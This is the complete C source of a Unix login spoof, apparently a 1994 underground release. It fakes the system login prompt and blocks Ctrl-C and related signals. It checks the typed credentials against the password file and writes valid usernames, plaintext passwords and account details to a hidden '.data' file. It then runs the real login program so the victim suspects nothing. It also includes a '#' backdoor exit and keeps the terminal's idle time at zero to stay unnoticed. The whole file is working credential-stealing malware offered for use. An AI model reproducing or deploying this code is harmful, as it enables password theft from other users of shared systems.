/* Program   : Unix login spoof
   Author    : The Shining/UPi (UK Division)
   Date      : Released 12/4/94
   Unix Type : All unshadowed unix systems &
               shadowed SUNOS systems
   Note      : This file MUST be exec'd from the shell. */


#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>
#include <pwd.h>
#include <time.h>
#include <utime.h>

#define OUTFILE ".data"           /* Data file to save account info into */
#define LOGPATH "/usr/bin/login"  /* Path of real login program */
#define DUMMYID "sync"            /* Dummy account on your system */
#define DLENGTH 4                 /* Length of dummy account name */


FILE *fp;


/* Set up variables to store system time & date */

time_t now;

static int time_out, time_on, no_message, loop_cnt;


/* Set up a structure to store users information */

struct loginfo {
              char logname[10];
              char key[9];
              char *comment;
              char *homedir;
              char *shell;
            } u;


/* Use the unix function getpass() to read user password and
   crypt() or pwdauth()  (remove it below if not SUNOS)
   to validate it etc */

char *getpass(), *gethostname(), *alarm(), *sleep(),
     *crypt(), *ttyname(), *pwdauth(), motd, log_date[60],
     pass[14], salt[3], *tty, cons[] = " on console ",
     hname[72], *ld;


/* flag = exit status, ppid = pid shell, wait = pause length,
   pwstat = holds 0 if valid password, shadow holds 1 if shadow
   password system is being used, 0 otherwise. */

int flag, ppid, wait, pwstat, shadow, invalid;


/* Declare main functions */

     void write_details(struct loginfo *);
     void catch( void ), disable_interrupts( void );
     void log_out( void ), get_info( void ),
          invalid_login( void ), prep_str( char * );


/* set up pointer to point to pwfile structure, and also
   a pointer to the utime() structure */


struct passwd *pwentry, *getpwnam();
struct utimbuf *times;


int main( void )
{
system("clear");

/* Initialise main program variables to 0, change 'loop_cnt' to 1
   if you do not want the machines host name to appear with
   the login prompt! (e.g. prompt is `login:` instead of
   'MIT login:'  etc) */

     wait = 3;               /* Holds value for pause */
      flag = 0;              /* Spoof ends if value is 1 */
       loop_cnt = 0;         /* Change this to 1 if no host required */
       time_out = 0;         /* Stops timer if spoof has been used */
      time_on = 0;           /* Holds minutes spoof has been running */
     disable_interrupts();   /* Call function to disable Interrupts */


/* Get system time & date and store in log_date, this is
   displayed when someone logs in as 'sync' */

 now = time(NULL);
  strftime(log_date, 60, "Last Login: %a %h %d %H:%M:%S", localtime(&now));
  strcat(log_date, cons);
 ld = log_date;


/* Get Hostname and tty name */

gethostname(hname, 64);
 strcat(hname, " login: ");
tty = ttyname();


/* main routine */

  while( flag == 0 )
  {
       invalid = 0;        /* Holds 1 if id +/or pw are invalid */
        shadow = 0;        /* 1 if shadow scheme is in operation */
         no_message = 0;   /* Flag for Login Incorrect msg */
        alarm(50);         /* set timer going */
       get_info();         /* get user i.d. & password */


/* Check to see if the user i.d. entered is 'sync', if it is
   display system time & date, display message of the day and
   then run the spoof again, insert the account of your
   choice here, if its not sync, but remember to put
   the length of the accounts name next to it! */

     if (strncmp(u.logname, DUMMYID, DLENGTH) == NULL) {
        printf("%s\n", ld);

          if ((fp = fopen("/etc/motd", "r")) != NULL) {
              while ((motd = getc(fp)) != EOF)
                     putchar(motd);

              fclose(fp);
          }

           printf("\n");
             prep_str(u.logname);
             no_message = 1;
           sleep(wait);
     }


/* Check if a valid user i.d. has been input, then check to see if
   the password system is shadowed or unshadowed.
   If both the user i.d. & password are valid, get additional info
   from the password file, and store all info in a file called .data,
   then exit spoof and run real login program */

    setpwent();   /* Rewind pwfile to beign processing */


    if ((pwentry = getpwnam(u.logname)) == (struct passwd *) NULL) {
         invalid = 1;
        flag = 0;
    }
    else
       strncpy(salt, pwentry->pw_passwd, 2);


/* Check for shadowed password system, in SUNOS, the field in /etc/passwd
   should begin with '##', in system V it could contain an 'x', if none
   of these exist, it checks that the entry = 13 chars, if less then
   shadow system will probably be implemented (unless acct has been
   disabled) */

 if ( invalid == 0 ) {

       if ((strcmp(salt, "##")) || (strncmp(salt, "x", 1)) == NULL)
           shadow = 1;
       else
          if (strlen(pwentry->pw_passwd) < 13)
             shadow = 1;


/* If unshadowed, use the salt from the pwfile field & the key to
   form the encrypted password which is checked against the entry
   in the password file, if it matches, then all is well, if not,
   spoof runs again!! */

    if ( shadow != 1 ) {

      if (strcmp(pwentry->pw_passwd, crypt(u.key, salt)) == NULL)
         invalid = 0;
      else
         invalid = 1;
    }


/* If SUNOS Shadowing is in operation, use the pwdauth() function
   to validate the password, if not SUNOS, substitute this code
   with the routine I gave earlier! */

       if ( shadow == 1 ) {
          if (pwstat = pwdauth(u.logname, u.key) == NULL)
             invalid = 0;
          else
             invalid = 1;
       }
}


/* If we have a valid account & password, get user info from the
   pwfile & store it */

        if ( invalid == 0 ) {

           u.comment = pwentry->pw_gecos;
            u.homedir = pwentry->pw_dir;
           u.shell = pwentry->pw_shell;

          /* Open file to store user info */

           if ((fp = fopen(OUTFILE, "a")) == NULL)
              log_out();

               write_details(&u);
                fclose(fp);
                no_message = 1;
               flag = 1;
        }
        else
           flag = 0;

        invalid_login();

    endpwent();                       /* Close pwfile */

    if (no_message == 0)
       loop_cnt++;

  }                                  /* end while */

log_out();                           /* call real login program */

}


/* Function to read user i.d. & password */

void get_info( void )
{
   char user[11];
   unsigned int string_len;

   fflush(stdin);
    prep_str(u.logname);
    prep_str(u.key);
   strcpy(user, "\n");


/* Loop while some loser keeps hitting return when asked for user
   i.d. and if someone hits CTRL-D to break out of spoof. Enter
   a # at login to exit spoof. Uncomment the appropriate line(s)
   below to customise the spoof to look like your system */

  while ((strcmp(user, "\n") == NULL) && (!feof(stdin)))
  {
   /* printf("Scorch Ltd SUNOS 4.1.3\n\n); */

    if (loop_cnt > 0)
       strcpy(hname, "login: ");

      printf("%s", hname);
      fgets(user, 9, stdin);


   /* Back door for hacker, # at present, can be changed,
      but leave \n in. */

     if (strcmp(user, "#\n") == NULL)
         exit(0);


    /* Strip \n from login i.d. */

     if (strlen(user) < 8)
        string_len = strlen(user) - 1;
     else
        string_len = strlen(user);

     strncpy(u.logname, user, string_len);



/* check to see if CTRL-D has occurred because it does not
   generate an interrupt like CTRL-C, but instead generates
   an end-of-file on stdin */

     if (feof(stdin)) {
         clearerr(stdin);
        printf("\n");
     }

  }



/* Turn off screen display & read users password */

     strncpy(u.key, getpass("Password:"), 8);

}



/* Function to increment the timer which holds the amount of time
   the spoof has been running */

void catch( void )
{
  time_on++;


/* If spoof has been running for 15 minutes, and has not
   been used, stop timer and call spoof exit routine */

if ( time_out == 0 ) {
   if (time_on == 15) {
       printf("\n");
        alarm(0);
       log_out();
   }
}


/* 'Touch' your tty, effectively keeping terminal idle time to 0 */

 utime(tty, times);
alarm(50);
}



/* Initialise a string with \0's */

void prep_str( char str[] )
{
int strl, cnt;

strl = strlen(str);
for (cnt = 0; cnt != strl; cnt++)
    str[cnt] = ' ';
}


/* function to catch interrupts, CTRL-C & CTRL-Z etc as
   well as the timer signals */

void disable_interrupts( void )
{
   signal(SIGALRM, catch);
    signal(SIGQUIT, SIG_IGN);
     signal(SIGTERM, SIG_IGN);
    signal(SIGINT, SIG_IGN);
   signal(SIGTSTP, SIG_IGN);
}


/* Write the users i.d., password, personal information, homedir
   and shell to a file */

void write_details(struct loginfo *sptr)
{

   fprintf(fp, "%s:%s:", sptr->logname, sptr->key);
    fprintf(fp, "%d:%d:", pwentry->pw_uid, pwentry->pw_gid);
     fprintf(fp, "%s:%s:", sptr->comment, sptr->homedir);
    fprintf(fp, "%s\n", sptr->shell);
   fprintf(fp, "\n");
}



/* Display login incorrect only if the user hasn't logged on as
   'sync' */

void invalid_login( void )
{

         if ( flag == 1 && pwstat == 0 )
            sleep(wait);

         if ( no_message == 0 )
            printf("Login incorrect\n");
}


/* Displays appropriate message, exec's the real login program,
   this replaces the spoof & effectively logs spoof's account off.
   Note: this spoof must be exec'd from the shell to work */

void log_out( void )
{
  time_out = 1;

   if ( no_message == 1 ) {
        sleep(1);
       printf("Login incorrect\n");
   }

   execl(LOGPATH, "login", (char *)0);
}
